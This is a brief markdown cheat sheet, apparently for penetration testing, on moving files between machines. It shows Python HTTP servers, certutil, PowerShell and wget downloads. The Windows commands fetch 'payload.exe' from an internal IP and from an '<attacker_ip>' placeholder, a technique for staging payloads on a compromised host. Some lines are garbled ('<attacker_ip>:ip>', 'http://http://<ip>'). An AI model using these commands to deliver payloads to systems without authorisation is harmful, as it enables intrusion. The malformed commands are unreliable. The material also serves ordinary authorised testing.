
###### Share any file using python
```bash
python -m SimpleHTTPServer 8080

python3 -m http.server 8080
```

-------------------------------
###### Command for download files on windows
```bash
certutil -urlcache -f http://10.10.36.2:8000/payload.exe payload.exe
```
###### PowerShell command for download on windows
```bash
Invoke-WebRequest -Uri "https://<attacker_ip>:ip>/payload.exe" -OutFile "payload.exe"
```


##### Download or access command by Linux
```bash
wget http://http://<ip>:<port>/file 
```
